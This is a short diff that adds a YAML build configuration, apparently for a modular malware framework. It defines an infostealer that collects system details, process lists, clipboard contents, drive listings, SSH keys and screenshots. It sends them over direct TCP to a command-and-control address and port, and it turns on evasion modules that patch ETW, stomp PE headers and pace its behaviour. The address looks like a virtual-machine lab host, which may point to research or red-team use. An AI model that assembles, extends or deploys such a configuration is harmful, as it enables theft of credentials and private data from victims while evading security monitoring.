@@ -1,0 +1,26 @@
+name: infostealer_header_stomp
+description: Infostealer with header stomping + ETW patch — zeros PE headers post-init
+
+core:
+  - core/emit_buffer
+  - core/file_ops
+
+collectors:
+  - collectors/system_info_api
+  - collectors/processes
+  - collectors/clipboard
+  - collectors/drives
+  - collectors/ssh_keys
+  - collectors/screenshot
+
+exfil: exfil/tcp_direct
+arch: arch/sequential
+
+evasion:
+  - evasion/etw_patch
+  - evasion/header_stomp
+  - evasion/behavioral_pacing
+
+vars:
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
